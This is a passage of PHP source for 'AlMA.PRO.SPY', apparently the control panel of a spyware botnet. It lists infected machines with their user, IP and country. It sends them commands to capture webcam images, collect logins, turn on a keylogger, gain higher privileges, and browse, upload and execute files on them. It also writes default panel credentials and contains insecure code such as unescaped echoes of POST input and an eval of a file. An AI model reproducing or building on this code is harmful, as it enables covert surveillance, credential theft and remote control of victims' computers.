							}
						}
						break;
					case 'gb':
						if (isset($_POST['botid'])){
							$dbcon = connectdb(); if ($dbcon === false){die('Error|Could not connect to the database.');}
							$rcon=$dbcon->prepare("SELECT * FROM bots WHERE botid = ?");if($rcon===false){
								die("Error ==> ".$dbcon->error);}else{
									$rcon->bind_param("s",$_POST['botid']);
									if($rcon->execute()==false){die('Either bot ID is not correct or the bot was deleted.');}else{$botcmd=$rcon->store_result();}
								}
							$bot="";
							$rcon->bind_result($bot);
							if($rcon->fetch()){
								if(!file_exists($bot)){mkdir($folder,0755,true);}
								if(file_exists($bot.'/goodbye.txt')){die('Bot is already waiting to be erased.');}
								file_put_contents($bot.'/goodbye.txt', '');
							}
						}
						break;
					case 'fmanmenu':
						if(!isset($_POST['type'])){die('Error: No type was given.');}
						switch(strtolower($_POST['type'])){
							case 'f':
								?>
								<div class='menu-item' title='Delete File' onclick="fman('del <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Delete File</div>
								<div class='menu-item' title='Upload File' onclick="fman('uf <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Upload File</div>
								<div class='menu-item' title='Rename File' onclick="var nn = prompt('Write the new name of the file');if(nn==null || nn==''){document.body.removeChild(document.body.firstChild);return;};fman('ren <?php echo $_POST['f']; ?>|'+nn);document.body.removeChild(document.body.firstChild);">Rename File</div>
								<div class='menu-item' title="Execute file" onclick="fman('x <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Execute file</div>
								<div class='menu-item' title="Execute file (cmd)" onclick="fman('x -cmd <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Execute file (cmd)</div>
								<?php
								break;
							case 'd':
								?>
								<div class='menu-item' title='Delete Directory' onclick="fman('del <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Delete Directory</div>
								<div class='menu-item' title='Rename Directory' onclick="var nn = prompt('Write the new name of the directory');if(nn==null || nn==''){document.body.removeChild(document.body.firstChild);return;};fman('ren <?php echo $_POST['f']; ?>|'+nn);document.body.removeChild(document.body.firstChild);">Rename Directory</div>
								<div class='menu-item' title="Open Directory (File manager)" onclick="fman('x <?php echo $_POST['f']; ?>');document.body.removeChild(document.body.firstChild);">Open Directory (File manager)</div>
								<?php
								break;
						}
						break;
				}
				break;
		}
	}elseif ($_SERVER['REQUEST_METHOD'] == 'GET') {
		if (!isset($loginneed)){showlogin();} // If $loginneed is not set, then show login screen anyway.
		if ($loginneed){
			if (!isset($_COOKIE[$cookiename])){showlogin();} // If the session cookie is not there, show login screen. [Changing $cookiename can cause this too.]
			if (!checksession($_COOKIE[$cookiename])){
				setcookie($cookiename,null,-1,'/'); // Erasing the cookie as a result of either session erased or config file erased.
				showlogin('Your session was terminated or expired.'); // Show login screen.
			}
		}
		?>
		<!DOCTYPE HTML>
		<html>
			<head>
				<title>AlMA.PRO.SPY - CPanel</title>
				<link rel="stylesheet" type="text/css" href="css/style.css">
				<?php include_once "imgs/background.php";if($dynamic){echo "<script>bg_time=".$changetime.";</script>";} ?>
				<script type="text/javascript" src="js/effects.js"></script>
			</head>
			<body onload="loaded();">
				<img src="imgs/background.php" class="bg-img" />
				<center>
					<div class='funs-bar'>
						<a title="Show bots' advanced control">
							<button class="button3ddown" title="Bots">Bots</button>
						</a>
						<a title="Show access' settings">
							<button class="button3dup" title="Access">Access</button>
						</a>
						<a title="Show sessions' settings">
							<button class="button3ddown" title="Sessions">Sessions</button>
						</a>
						<a title="Show database's settings">
							<button class="button3dup" title="Database">Database</button>
						</a>
						<a title="Show CPanel's settings">
							<button class="button3ddown" title="CPanel">CPanel</button>
						</a>
						<a title="Show Statics">
							<button class="button3ddown" title="Statics">Statics</button>
						</a>
					</div>
					<button class='buttonspinleft' style='position: absolute;right: 1%;top: 1%;' title="Refresh bots' list"></button>
					<img src="imgs/no-sound.svg" style="position: absolute;top: 2.5%;right: 8%;width: 35px;height: 35px;" id="nosound">
					<img class='logout' src='imgs/logout.png' />
					<div class='bots-view'>
						<div style='width: 100%;height: 7%;'>
							<b id='bots-count'>Total bots: 0 - </b>
							<b>Show: </b>
							<select class='input' id='bots-sort'>
								<option selected='' value='1'>Active</option>
								<option value='0'>Offline</option>
								<option value='2'>Both</option>
							</select>
						</div>
						<div style='height: 8%;'>
							<ul>
								<li><b>Selected</b></li>
								<li><b>Bot ID</b></li>
								<li><b>Bot Name</b></li>
								<li><b>User Name</b></li>
								<li><b>Device Name</b></li>
								<li><b>OS</b></li>
								<li><b>IP</b></li>
								<li><b>Country</b></li>
								<li><b>Version</b></li>
								<li><b>Webcam</b></li>
							</ul>
						</div>
						<div style='overflow-y: auto;height: 79%;' id='bots-list'>
							<?php
							$dbcon = connectdb(); if ($dbcon === false){
								echo "<div id='dberror' style='color: red;font-size: 20px;'>Something went wrong with connection to mysql database!
								<br>Check database info in <a style='color: blue;position: inherit;' title='Check database info'>Settings</a>
								</div>";
							}else{
								?>
								<script>
									dobots();
								</script>
								<?php
							}
							?>
						</div>
						<div style='width: 100%;'>
							<button class='input' style='width: 20%;font-size: 70%;' wc='c' title='Check or Uncheck All bots'>Check all</button>
							<b>Action: </b>
							<select class='input' style='width: 30%;font-size: 70%;' id='actions'>
								<option selected='' value='0'>Change wait time</option>
								<option value='1'>Send a Webcam (If Available)</option>
								<option value='2'>Send Logins</option>
								<option value='3'>Send Idle Time</option>
								<option value='4'>Enable Keyslogger (If Available)</option>
								<option value='5'>Disable Keyslogger</option>
								<option value='6'>Send all logs</option>
								<option value='7'>Get Higher</option>
							</select>
							<button class='input' title='Do selected action' style='width: 30%;font-size: 70%;'>Do action</button>
						</div>
					</div>
					<br><br>
				</center>
			</body>
		</html>
		<?php
	}
	//////////////////////////////////
	//////////// FUNCTIONS ///////////
	//////////////////////////////////
	function getrnd($length = 32) {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}
	function savesession($user,$cv,$ct){
		global $user_agent;
		global $useragent;
		$os_platform="Unknown OS Platform"; // Getting OS info.
	    $os_array=array('/windows nt 10/i'      =>  'Windows 10',
	                    '/windows nt 6.3/i'     =>  'Windows 8.1',
	                    '/windows nt 6.2/i'     =>  'Windows 8',
	                    '/windows nt 6.1/i'     =>  'Windows 7',
	                    '/windows nt 6.0/i'     =>  'Windows Vista',
	                    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                    '/windows nt 5.1/i'     =>  'Windows XP',
	                    '/windows xp/i'         =>  'Windows XP',
	                    '/windows nt 5.0/i'     =>  'Windows 2000',
	                    '/windows me/i'         =>  'Windows ME',
	                    '/win98/i'              =>  'Windows 98',
	                    '/win95/i'              =>  'Windows 95',
	                    '/win16/i'              =>  'Windows 3.11',
	                    '/macintosh|mac os x/i' =>  'Mac OS X',
	                    '/mac_powerpc/i'        =>  'Mac OS 9',
	                    '/linux/i'              =>  'Linux',
	                    '/ubuntu/i'             =>  'Ubuntu',
	                    '/iphone/i'             =>  'iPhone',
	                    '/ipod/i'               =>  'iPod',
	                    '/ipad/i'               =>  'iPad',
	                    '/android/i'            =>  'Android',
	                    '/blackberry/i'         =>  'BlackBerry',
	                    '/webos/i'              =>  'Mobile');
	    foreach ($os_array as $regex => $value) {
	        if (preg_match($regex, $user_agent)) {
	            $os_platform=$value;
	        }
	    }
		$browser=($useragent!="") ? $useragent : "Unknown Browser"; // Getting browser info.
	    $browser_array=array('/msie/i'      =>  'Internet Explorer',
							'/firefox/i'    =>  'FireFox',
							'/safari/i'     =>  'Safari',
							'/chrome/i'     =>  'Chrome',
							'/edge/i'       =>  'Edge',
							'/opera/i'      =>  'Opera',
							'/netscape/i'   =>  'Netscape',
							'/maxthon/i'    =>  'Maxthon',
							'/konqueror/i'  =>  'Konqueror',
							'/mobile/i'     =>  'Handheld Browser');
	    foreach ($browser_array as $regex => $value) {
	        if (preg_match($regex, $user_agent)) {
	            $browser=$value;
	        }
	    }
    	addsettings('	//'.$user.'|'.$cv.'|'.$ct.'|'.$os_platform.'|'.$browser);
	}
	function checksession($cv){
		$ok=false;
		if (!file_exists('config.php')) {return false;}
		$handle = fopen("config.php", "r");
		while (($line = fgets($handle)) !== false) {
		    if (strpos($line,"|")!==false) {
		    	$settings=explode("|", $line);
		    	if($settings[2] < time()){deletesession($settings[1]);}
		        if($settings[1]==$cv){if($settings[2] > time()){$ok=true;}else{deletesession($settings[1]);}}
		    }
		}
		fclose($handle);
		return $ok;
	}
	function getsessiontimeout($cv){
		if (!file_exists('config.php')) {return '-1';}
		$handle = fopen("config.php", "r");
		while (($line = fgets($handle)) !== false) {
		    if (strpos($line,"|")!==false) {
		    	$settings=explode("|", $line);
		        if($settings[1]==$cv){if($settings[2] > time()){return $settings[2];}else{deletesession($settings[1]);}}
		    }
		}
		fclose($handle);
	}
	function deletesession($cv){
		$ok=false;
		if (!file_exists('config.php')) {return true;}
		$newdata='';
		foreach (file('config.php') as $line) {
			if (preg_match('/|/', $line)) {
		    	$settings=explode("|", $line);
		        if($settings[1]==$cv){$ok=true;}else{$newdata.=$line;}
		    }else{$newdata.=$line;}
		}
		$hw = fopen("config.php", "w");
		fwrite($hw, $newdata);
		fclose($hw);
		return $ok;
	}
	function showlogin($msg=''){
		if (!file_exists('config.php')){ // If config file is not there, write a new one.
			$msg='Config file was not found (config.php)! Default config was set.'."\r\n".' Login: almapro - Password: leader';
			$cfg = fopen('config.php', 'w');
			$cfgtxt='<?php'."\r\n";
			$cfgtxt.="	date_default_timezone_set('Africa/Tripoli'); // Set your timezone according to PHP website, so you see correct time. [Default: Africa/Tripoli].";
			$cfgtxt.="	\$useragent=''; // Set UserAgent for restricting access to the ControlPanel [Default: '']. **Recommended**\r\n";
			$cfgtxt.="	\$dbhost='localhost'; // Database host.\r\n";
			$cfgtxt.="	\$dbuser='root'; // Database username.\r\n";
			$cfgtxt.="	\$dbpass=''; // Database password.\r\n";
			$cfgtxt.="	\$dbname='apsdb'; // AlMA.PRO.SPY database [Default: apsdb].\r\n";
			$cfgtxt.="	\$logins=array('almapro' => 'leader', '' => ''); // AlMA.PRO.SPY logins' details (user => pass) [Default: almapro => leader].\r\n";
			$cfgtxt.="	\$loginneed= true; // Whether login is needed or not [Default: true = needed].\r\n";
			$cfgtxt.="	\$cookiename='aps_session'; // Cookie name for organizing active sessions [Default: aps_session].\r\n";
			$cfgtxt.="	\$cookietimeout=(86400 * 3); // Cookie timeout [Default: (86400 * 3)]. Means 3 days (86400 ==> 1 day).\r\n";
			$cfgtxt.="?>";
			fwrite($cfg, $cfgtxt);
			fclose($cfg);
		}
		?>
		<!DOCTYPE HTML>
		<html>
			<head>
				<title>AlMA.PRO.SPY - CPanel - Login</title>
				<link rel="stylesheet" type="text/css" href="css/style.css">
				<?php include_once "imgs/background.php";if($dynamic){echo "<script>bg_time=".$changetime.";</script>";} ?>
				<script type="text/javascript" src="js/effects.js"></script>
				<?php eval(file_get_contents('js/jquery.js')); ?>
			</head>
			<body onload="loaded();">
				<img src="imgs/background.php" class="bg-img" />
				<center>
					<img src="imgs/no-sound.svg" style="position: absolute;top: 2.5%;right: 8%;width: 35px;height: 35px;" id="nosound">
					<div class='login'>
						<div id='login-des' class='login-result'><?php echo $msg; ?></div>
						<form id="login-form" method="post" action="">
							<input name="user" id='user' class='login-input' type='text' />
							<input name="pass" id='pass' autocomplete="on" class='login-input' type='password' />
						</form>
						<button class="progress-button" title="Login">
							<span class="content">Login</span>
							<span class="progress">
								<span class="progress-inner"></span>
							</span>
						</button>
					</div>
				</center>
			</body>
		</html>
		<?php
		die('');
	}
	function checklogins($user,$pass){
		global $logins;
		foreach ($logins as $login => $password){if ($login == $user){if ($password == $pass){return true;}else{die('Password is not correct!');}}}
	    die('User is not correct!');
	}
	function addsettings($setting){
		$config=file_get_contents('config.php'); // Get the config file's data.
		$cf = fopen('config.php', 'w'); // Open the config file to write.
		$config=str_replace("?>", "", $config); // Replace the ending PHP tag from the config file's data.
		$config.=$setting."\r\n".'?>'; // Add the new setting's line to the config file's data, and append a new line and PHP ending tag.
		fwrite($cf, $config); // Write the new data.
		fclose($cf); // Close the config file.
	}
	function editsettings($setting,$newval,$login=false,$pass=false){
		global $logins;
		$ok = false;
		if (!file_exists('config.php')){return false;} // If no config file, 'return false' as no.
		$setting=str_replace("\$", "", $setting); // Make sure we don't get the actual value of the setting.
		$newval=str_replace("'", "", $newval); // Make sure we don't cause any problems in config file.
		$newdata='';
		foreach (file('config.php') as $line){
			if ($login){ // Check if it's a login edit.
				if (preg_match('/logins=/', $line)){
					if ($pass){ // Check if it's a pass edit.
						$logins[$setting]=$newval; // Change the old password with the new one.
					}else{ // Not a pass edit, so it's a username edit.
						$logins[$newval]=$logins[$setting]; // Copy the old username's password to the new username.
						unset($logins[$setting]); // Remove the old username.
					}
					$newlogins='	$logins=array('; // Rewrite the $logins line completely.
					foreach ($logins as $key => $value) {
						$newlogins.="'$key' => '$value',"; // Add new logins to the $newlogins variable.
					}
					$newlogins = rtrim($newlogins,','); // Remove the last ',' mark, as we need it no more.
					$lienparts = explode(';', $line); // Split the line with ';' mark, so we get what's written as description.
					$newlogins.=');'.$lienparts[1]; // Appending the description part to the logins' line.
					$newdata.=$newlogins; // Time to write the new line.
				}else{$newdata.=$line;}
			}else{ // Not a login edit.
				if ($setting==''){return false;} // Check if no setting name, 'return false' as no.
				if (preg_match('/'.$setting.'=/', $line)){ // Check if this line is the one to be modified.
					$dataarr1 = explode($setting.'=', $line); // Split the line with '=' mark, so we get the beginning of the line where the setting is.
					$dataarr2 = explode(';', $dataarr1[1]); // Split the second part of the line with ';' mark, so we get what's written as description.
					// Time to write the new line with a little condition.
					$newdata .= ($setting=='cookietimeout' || $setting=='loginneed') ? $dataarr1[0]."$setting=$newval;".$dataarr2[1] : $dataarr1[0]."$setting='$newval';".$dataarr2[1];
				}else{$newdata.=$line;} // The line is not the one, skip it.
			}
		}
		$cf = fopen('config.php', 'w');
		fwrite($cf, $newdata);
		fclose($cf);
		return $ok;
	}
	function connectdb(){ //Connect to the database function.
		global $dbhost; // Import variable from global scope.
		global $dbuser; // Import variable from global scope.
		global $dbpass; // Import variable from global scope.
		global $dbname; // Import variable from global scope.
		// If the next line of functions has one failure try, 'return false' as no.
		$con = new mysqli($dbhost, $dbuser, $dbpass,$dbname);
		if($con->connect_error){return false;}
		if ($con->query("SET NAMES 'utf8' COLLATE 'utf8_unicode_ci'") === false) {return false;}
		// Connected, 'return true' as yes.
		return $con;
	}
	function endsWith($haystack, $needle){
		$length = strlen($needle);
		if ($length == 0) {
			return true;
	 	}
	    return (substr($haystack, -$length) === $needle);
	}
?>
